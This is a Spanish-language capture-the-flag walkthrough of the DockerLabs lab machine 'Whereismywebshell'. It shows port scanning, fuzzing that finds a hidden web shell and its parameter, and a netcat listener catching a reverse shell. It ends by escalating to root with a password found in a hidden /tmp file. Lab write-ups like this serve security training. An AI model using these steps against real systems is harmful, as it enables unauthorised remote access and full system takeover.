@@ -1,0 +1,174 @@
+---
+title: DockerLabs - Whereismywebshell
+author: elcybercurioso
+date: 2025-10-27 13:00
+categories: [Post, DockerLabs]
+tags: [fácil, ]
+media_subpath: "/assets/img/posts/dockerlabs_whereismywebshell"
+image:
+  path: main.webp
+published: false
+---
+
+## nmap
+
+```bash
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
+└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 10:19 GMT
+Initiating ARP Ping Scan at 10:19
+Scanning 172.17.0.2 [1 port]
+Completed ARP Ping Scan at 10:19, 0.11s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 10:19
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 80/tcp on 172.17.0.2
+Completed SYN Stealth Scan at 10:19, 9.58s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.2
+Host is up (0.000046s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+```
+
+```bash
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
+└─$ nmap -sCV -p80 172.17.0.2                                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 10:22 GMT
+Nmap scan report for consolelog.lab (172.17.0.2)
+Host is up (0.000062s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
+```
+
+## análisis
+
+Comenzamos revisando la pagina web alojada en el puerto 80 de la maquina, donde al final nos dan una pequeña pista de por donde empezar a escalar privilegios una vez obtengamos acceso:
+
+![Desktop View](/20251027112023.webp){: width="972" height="589" .shadow}
+
+Fuzzeamos en busca de recursos que puedan servirnos para obtener una consola:
+
+```bash
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
+└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .txt,.html,.php 
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 2510]
+/shell.php            (Status: 500) [Size: 0]
+/warning.html         (Status: 200) [Size: 315]
+Progress: 882228 / 882228 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+Encontramos un recurso llamado `shell.php`, pero parece ser que necesitamos un parámetro el cual debemos pasarle para que se ejecute correctamente el script:
+
+![Desktop View](/20251027113227.webp){: width="972" height="589" .shadow}
+
+Tambien descubrimos que existe un fichero llamado `warning.html`, el cual nos da a entender que debemos fuzzear por el parámetro del fichero `shell.php`:
+
+![Desktop View](/20251027112513.webp){: width="972" height="589" .shadow}
+
+Tras fuzzear, encontramos cual es parámetro que podemos usar:
+
+```bash
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
+└─$ wfuzz -c --hc=404,500 --hh=0 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://172.17.0.2/shell.php?FUZZ=whoami" -t 200 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://172.17.0.2/shell.php?FUZZ=whoami
+Total requests: 6453
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
+=====================================================================
+
+000004007:   200        2 L      2 W        21 Ch       "p********"                                                                                                                                       
+
+Total time: 11.33796
+Processed Requests: 6453
+Filtered Requests: 6452
+Requests/sec.: 569.1495
+```
+
+## explotación
+
+Empleando el parámetro que hemos encontrado, podemos ejecutar comandos:
+
+![Desktop View](/20251027114112.webp){: width="972" height="589" .shadow}
+
+Teniendo esto ya definido, podemos obtener la consola:
+
+```bash
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
+└─$ nc -nlvp 4444  
+listening on [any] 4444 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 58404
+bash: cannot set terminal process group (23): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@d4d4dbf1a2c0:/var/www/html$ whoami
+whoami
+www-data
+```
+
+## escalada de privilegios
+
+Haciendo caso a la pista que nos dieron al principio, nos dirigimos a la carpeta `/tmp`, donde encontramos el fichero `.secret.txt`:
+
+```bash
+www-data@d4d4dbf1a2c0:/tmp$ ls -la
+total 12
+drwxrwxrwt 1 root root 4096 Oct 27 10:19 .
+drwxr-xr-x 1 root root 4096 Oct 27 10:18 ..
+-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
+```
+
+Y dentro, está la supuesta contraseña del usuario `root`:
+
+```bash
+www-data@d4d4dbf1a2c0:/tmp$ cat .secret.txt 
+cont***************
+```
+
+Probamos a conectarnos como el usuario `root`, y validamos que efectivamente se trata de su contraseña:
+
+```bash
+www-data@d4d4dbf1a2c0:/tmp$ su root
+Password: 
+root@d4d4dbf1a2c0:/tmp# whoami
+root
+```
+
+<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
